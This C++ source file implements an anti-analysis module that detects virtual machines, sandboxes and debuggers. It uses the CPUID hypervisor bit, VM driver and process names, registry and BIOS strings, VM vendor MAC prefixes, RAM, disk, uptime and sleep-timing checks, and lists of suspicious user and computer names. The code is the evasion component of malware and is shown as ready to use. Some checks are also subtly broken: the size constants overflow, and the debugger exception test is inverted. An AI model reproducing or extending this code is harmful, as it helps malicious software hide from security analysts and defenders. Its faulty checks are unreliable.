#include "antianalysis.h"
#include <intrin.h>
#include <Psapi.h>
#include <TlHelp32.h>
#include <Iphlpapi.h>
#pragma comment(lib, "iphlpapi.lib")
#pragma comment(lib,"Psapi.lib")
bool antianalysis::checkcpuid() {
    int cpuid[4];
    __cpuid(cpuid, 1);
    return (cpuid[2] & (1 << 31)) != 0;
}
bool antianalysis::checkcpucores() {
    SYSTEM_INFO sysinfo;
    GetSystemInfo(&sysinfo);
    return sysinfo.dwNumberOfProcessors < 2;
}
bool antianalysis::checkram() {
    MEMORYSTATUSEX mem;
    mem.dwLength = sizeof(mem);
    GlobalMemoryStatusEx(&mem);
    return mem.ullTotalPhys < (1024 * 1024 * 1024 * 2);
}
bool antianalysis::checkdisk() {
    ULARGE_INTEGER freebytes;
    GetDiskFreeSpaceExA("C:\\", NULL, NULL, &freebytes);
    return freebytes.QuadPart < (1024 * 1024 * 1024 * 60);
}
bool antianalysis::checkuptime() {
    return GetTickCount64() < 300000;
}
bool antianalysis::checkprocesses() {
    std::vector<std::wstring> badprocs = { L"vboxservice.exe",L"vboxtray.exe",L"vmwaretray.exe",L"vmwareuser.exe",L"vmusrvc.exe",L"prl_cc.exe",L"prl_tools.exe",L"xenservice.exe",L"qemu-ga.exe",L"procmon.exe",L"procmon64.exe",L"wireshark.exe",L"fiddler.exe",L"httpdebugger.exe",L"x64dbg.exe",L"x32dbg.exe",L"ollydbg.exe",L"ida.exe",L"ida64.exe",L"dumpcap.exe" };
    HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (snap == INVALID_HANDLE_VALUE)return false;
    PROCESSENTRY32W pe; pe.dwSize = sizeof(pe);
    if (!Process32FirstW(snap, &pe)) { CloseHandle(snap); return false; }
    do {
        for (const auto& bad : badprocs) {
            if (_wcsicmp(pe.szExeFile, bad.c_str()) == 0) { CloseHandle(snap); return true; }
        }
    } while (Process32NextW(snap, &pe));
    CloseHandle(snap);
    return false;
}
bool antianalysis::checkdrivers() {
    std::vector<std::wstring> baddrivers = { L"vboxguest.sys",L"vboxmouse.sys",L"vboxsf.sys",L"vboxvideo.sys",L"vmdebug.sys",L"vmmouse.sys",L"vm3dmp.sys",L"vmci.sys",L"vmusbmouse.sys",L"vmx_svga.sys",L"vmxnet.sys",L"VBoxMouse.sys",L"VBoxGuest.sys",L"VBoxSF.sys",L"VBoxVideo.sys",L"hgfs.sys",L"vmhgfs.sys",L"prl_boot.sys",L"prl_eth.sys",L"prl_fs.sys",L"prl_fs_freeze.sys",L"prl_mouf.sys",L"prl_pv32.sys",L"prl_pv64.sys",L"prl_scsi.sys",L"prl_sound.sys",L"prl_tg.sys",L"prl_time.sys",L"prl_vid.sys",L"prl_hypervsynth.sys",L"prl_str.sys",L"prl_svesc.sys" };
    LPVOID drivers[1024]; DWORD needed;
    if (EnumDeviceDrivers(drivers, sizeof(drivers), &needed)) {
        DWORD count = needed / sizeof(drivers[0]);
        for (DWORD i = 0; i < count; i++) {
            WCHAR name[MAX_PATH];
            if (GetDeviceDriverBaseNameW(drivers[i], name, MAX_PATH)) {
                for (const auto& bad : baddrivers) {
                    if (_wcsicmp(name, bad.c_str()) == 0)return true;
                }
            }
        }
    }
    return false;
}
bool antianalysis::checkwindows() {
    wchar_t computername[MAX_COMPUTERNAME_LENGTH + 1];
    DWORD size = MAX_COMPUTERNAME_LENGTH + 1;
    GetComputerNameW(computername, &size);
    std::wstring name = computername;
    std::vector<std::wstring> badnames = { L"SANDBOX",L"VIRUS",L"MALWARE",L"ANALYSIS",L"TEST",L"WIN7",L"WINXP",L"WIN8",L"WIN10-TEST",L"John",L"Anna",L"WDAGUtilityAccount" };
    for (const auto& bad : badnames) {
        if (name.find(bad) != std::wstring::npos)return true;
    }
    return false;
}
bool antianalysis::checkdebugger() {
    if (IsDebuggerPresent())return true;
    BOOL debugged = FALSE;
    CheckRemoteDebuggerPresent(GetCurrentProcess(), &debugged);
    if (debugged)return true;
    __try { RaiseException(DBG_CONTROL_C, 0, 0, NULL); }
    __except (EXCEPTION_EXECUTE_HANDLER) { return true; }
    return false;
}
bool antianalysis::checkvmreg() {
    HKEY hkey;
    if (RegOpenKeyExW(HKEY_LOCAL_MACHINE, L"HARDWARE\\ACPI\\DSDT\\VBOX__", 0, KEY_READ, &hkey) == ERROR_SUCCESS) { RegCloseKey(hkey); return true; }
    if (RegOpenKeyExW(HKEY_LOCAL_MACHINE, L"HARDWARE\\ACPI\\FADT\\VBOX__", 0, KEY_READ, &hkey) == ERROR_SUCCESS) { RegCloseKey(hkey); return true; }
    if (RegOpenKeyExW(HKEY_LOCAL_MACHINE, L"HARDWARE\\ACPI\\RSDT\\VBOX__", 0, KEY_READ, &hkey) == ERROR_SUCCESS) { RegCloseKey(hkey); return true; }
    if (RegOpenKeyExW(HKEY_LOCAL_MACHINE, L"SYSTEM\\CurrentControlSet\\Services\\Disk\\Enum", 0, KEY_READ, &hkey) == ERROR_SUCCESS) {
        wchar_t value[256]; DWORD valsize = sizeof(value);
        if (RegQueryValueExW(hkey, L"0", NULL, NULL, (LPBYTE)value, &valsize) == ERROR_SUCCESS) {
            std::wstring val = value;
            if (val.find(L"VBOX") != std::wstring::npos || val.find(L"VMWARE") != std::wstring::npos || val.find(L"VIRTUAL") != std::wstring::npos) { RegCloseKey(hkey); return true; }
        }
        RegCloseKey(hkey);
    }
    return false;
}
bool antianalysis::checkvmacpi() {
    char biosData[128] = { 0 };
    DWORD size = sizeof(biosData);
    HKEY hKey;
    if (RegOpenKeyExA(HKEY_LOCAL_MACHINE,
        "HARDWARE\\DESCRIPTION\\System\\BIOS",
        0, KEY_READ, &hKey) == ERROR_SUCCESS) {
        const char* keys[] = { "SystemManufacturer", "SystemProductName" };
        for (auto key : keys) {
            DWORD type = 0;
            size = sizeof(biosData);
            if (RegQueryValueExA(hKey, key, nullptr, &type, (LPBYTE)biosData, &size) == ERROR_SUCCESS) {
                std::string val(biosData);
                if (val.find("VMware") != std::string::npos ||
                    val.find("VirtualBox") != std::string::npos ||
                    val.find("QEMU") != std::string::npos ||
                    val.find("Xen") != std::string::npos ||
                    val.find("Hyper-V") != std::string::npos) {
                    RegCloseKey(hKey);
                    return true;
                }
            }
        }
        RegCloseKey(hKey);
    }
    return false;
}
bool antianalysis::checkvmmac() {
    IP_ADAPTER_INFO adapterinfo[16];
    ULONG buflen = sizeof(adapterinfo);
    if (GetAdaptersInfo(adapterinfo, &buflen) == ERROR_SUCCESS) {
        PIP_ADAPTER_INFO padapter = adapterinfo;
        while (padapter) {
            unsigned char* mac = padapter->Address;
            if ((mac[0] == 0x00 && mac[1] == 0x05 && mac[2] == 0x69) ||
                (mac[0] == 0x00 && mac[1] == 0x0C && mac[2] == 0x29) ||
                (mac[0] == 0x00 && mac[1] == 0x1C && mac[2] == 0x14) ||
                (mac[0] == 0x00 && mac[1] == 0x50 && mac[2] == 0x56) ||
                (mac[0] == 0x08 && mac[1] == 0x00 && mac[2] == 0x27))return true;
            padapter = padapter->Next;
        }
    }
    return false;
}
bool antianalysis::checksandboxuser() {
    wchar_t username[256]; DWORD size = 256;
    GetUserNameW(username, &size);
    std::wstring user = username;
    std::vector<std::wstring> badusers = { L"USER",L"ADMIN",L"SANDBOX",L"MALWARE",L"VIRUS",L"TEST" };
    for (const auto& bad : badusers) {
        if (user.find(bad) != std::wstring::npos)return true;
    }
    return false;
}
bool antianalysis::checksleep() {
    DWORD start = GetTickCount();
    Sleep(1000);
    DWORD end = GetTickCount();
    DWORD diff = end - start;
    return diff < 1000;
}
bool antianalysis::runallchecks() {
    return isvm() || issandbox() || isdebugged();
}
bool antianalysis::isvm() {
    return checkcpuid() || checkvmacpi() || checkvmmac() || checkvmreg() || checkdrivers();
}
bool antianalysis::issandbox() {
    return checkcpucores() || checkram() || checkdisk() || checkuptime() || checkprocesses() || checkwindows() || checksandboxuser() || checksleep();
}
bool antianalysis::isdebugged() {
    return checkdebugger();
}